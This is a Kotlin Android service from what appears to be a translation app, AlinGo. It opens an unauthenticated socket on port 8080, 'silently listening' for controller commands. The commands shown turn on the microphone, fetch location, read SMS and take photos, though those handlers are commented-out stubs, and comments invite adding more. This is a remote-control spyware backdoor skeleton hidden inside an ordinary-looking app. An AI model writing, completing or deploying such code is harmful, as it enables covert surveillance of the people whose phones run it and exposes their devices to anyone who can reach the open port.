package com.alingo.translate.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.alingo.translate.MainActivity
import java.net.ServerSocket
import kotlin.concurrent.thread

class AgentService : Service() {

    private var serverSocket: ServerSocket? = null
    private var isListening = true

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1001, buildNotification())

        // اگر پہلے سے نہیں چل رہا تو سننا شروع کریں
        if (serverSocket == null) {
            startListeningForController()
        }

        return START_STICKY
    }

    private fun startListeningForController() {
        thread(isDaemon = true) {
            try {
                // AlinGo Controller یہاں (پورٹ 8080) پر کمانڈ بھیجے گا
                serverSocket = ServerSocket(8080)
                Log.d("AlinGoAgent", "Agent is silently listening on port 8080")

                while (isListening) {
                    val client = serverSocket?.accept() ?: break
                    val command = client.getInputStream().bufferedReader().readLine()
                    executeCommand(command)
                    client.close()
                }
            } catch (e: Exception) {
                Log.e("AlinGoAgent", "Listener stopped: ${e.message}")
            }
        }
    }

    private fun executeCommand(command: String?) {
        if (command == null) return
        Log.d("AlinGoAgent", "Received command: $command")

        when (command) {
            "PING" -> Log.d("AlinGoAgent", "PONG")
            "START_MIC" -> { /* MicHandler.start(this) */ }
            "STOP_MIC" -> { /* MicHandler.stop() */ }
            "GET_LOCATION" -> { /* LocationHandler.get(this) */ }
            "GET_SMS" -> { /* SmsHandler.get(this) */ }
            "TAKE_PHOTO" -> { /* CameraHandler.capture(this) */ }
            // مزید کمانڈز یہاں شامل کریں
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, "AgentChannel")
                .setContentTitle("AlinGo Agent Ready")
                .setContentText("Waiting for controller commands...")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("AlinGo Agent Ready")
                .setContentText("Waiting for controller commands...")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("AgentChannel", "AlinGo Agent", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        isListening = false
        try { serverSocket?.close() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
